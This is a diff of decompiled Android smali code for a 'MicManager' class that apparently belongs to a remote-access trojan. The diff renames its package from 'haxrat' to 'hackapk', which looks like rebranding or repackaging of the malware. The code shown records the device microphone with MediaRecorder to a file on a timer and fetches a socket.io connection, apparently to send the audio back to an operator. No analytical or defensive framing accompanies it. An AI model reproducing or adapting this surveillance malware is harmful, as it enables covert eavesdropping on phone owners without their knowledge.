@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/MicManager;
+.class public Lcom/justhack/hackapk/MicManager;
 .super Ljava/lang/Object;
 .source "MicManager.java"
 
@@ -6,7 +6,7 @@
 # annotations
 .annotation system Ldalvik/annotation/MemberClasses;
     value = {
-        Lcom/hax4us/haxrat/MicManager$100000000;
+        Lcom/justhack/hackapk/MicManager$100000000;
     }
 .end annotation
 
@@ -29,7 +29,7 @@
 
     check-cast v2, Ljava/io/File;
 
-    sput-object v2, Lcom/hax4us/haxrat/MicManager;->audiofile:Ljava/io/File;
+    sput-object v2, Lcom/justhack/hackapk/MicManager;->audiofile:Ljava/io/File;
 
     return-void
 .end method
@@ -171,11 +171,11 @@
     move-result-object v7
 
     .line 77
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v7
 
-    invoke-virtual {v7}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v7}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v7
 
@@ -271,7 +271,7 @@
     .line 32
     move v0, p0
 
-    invoke-static {}, Lcom/hax4us/haxrat/MainService;->getContextOfApplication()Landroid/content/Context;
+    invoke-static {}, Lcom/justhack/hackapk/MainService;->getContextOfApplication()Landroid/content/Context;
 
     move-result-object v5
 
@@ -306,7 +306,7 @@
 
     move-result-object v5
 
-    sput-object v5, Lcom/hax4us/haxrat/MicManager;->audiofile:Ljava/io/File;
+    sput-object v5, Lcom/justhack/hackapk/MicManager;->audiofile:Ljava/io/File;
     :try_end_0
     .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -321,33 +321,33 @@
 
     invoke-direct {v6}, Landroid/media/MediaRecorder;-><init>()V
 
-    sput-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sput-object v5, Lcom/justhack/hackapk/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     .line 44
-    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v5, Lcom/justhack/hackapk/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     const/4 v6, 0x1
 
     invoke-virtual {v5, v6}, Landroid/media/MediaRecorder;->setAudioSource(I)V
 
     .line 45
-    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v5, Lcom/justhack/hackapk/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     const/4 v6, 0x2
 
     invoke-virtual {v5, v6}, Landroid/media/MediaRecorder;->setOutputFormat(I)V
 
     .line 46
-    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v5, Lcom/justhack/hackapk/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     const/4 v6, 0x3
 
     invoke-virtual {v5, v6}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V
 
     .line 47
-    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v5, Lcom/justhack/hackapk/MicManager;->recorder:Landroid/media/MediaRecorder;
 
-    sget-object v6, Lcom/hax4us/haxrat/MicManager;->audiofile:Ljava/io/File;
+    sget-object v6, Lcom/justhack/hackapk/MicManager;->audiofile:Ljava/io/File;
 
     invoke-virtual {v6}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
 
@@ -356,17 +356,17 @@
     invoke-virtual {v5, v6}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V
 
     .line 48
-    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v5, Lcom/justhack/hackapk/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     invoke-virtual {v5}, Landroid/media/MediaRecorder;->prepare()V
 
     .line 49
-    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v5, Lcom/justhack/hackapk/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     invoke-virtual {v5}, Landroid/media/MediaRecorder;->start()V
 
     .line 52
-    new-instance v5, Lcom/hax4us/haxrat/MicManager$100000000;
+    new-instance v5, Lcom/justhack/hackapk/MicManager$100000000;
 
     move-object v9, v5
 
@@ -374,9 +374,9 @@
 
     move-object v6, v9
 
-    invoke-direct {v6}, Lcom/hax4us/haxrat/MicManager$100000000;-><init>()V
+    invoke-direct {v6}, Lcom/justhack/hackapk/MicManager$100000000;-><init>()V
 
-    sput-object v5, Lcom/hax4us/haxrat/MicManager;->stopRecording:Ljava/util/TimerTask;
+    sput-object v5, Lcom/justhack/hackapk/MicManager;->stopRecording:Ljava/util/TimerTask;
 
     .line 63
     new-instance v5, Ljava/util/Timer;
@@ -389,7 +389,7 @@
 
     invoke-direct {v6}, Ljava/util/Timer;-><init>()V
 
-    sget-object v6, Lcom/hax4us/haxrat/MicManager;->stopRecording:Ljava/util/TimerTask;
+    sget-object v6, Lcom/justhack/hackapk/MicManager;->stopRecording:Ljava/util/TimerTask;
 
     move v7, v0
 
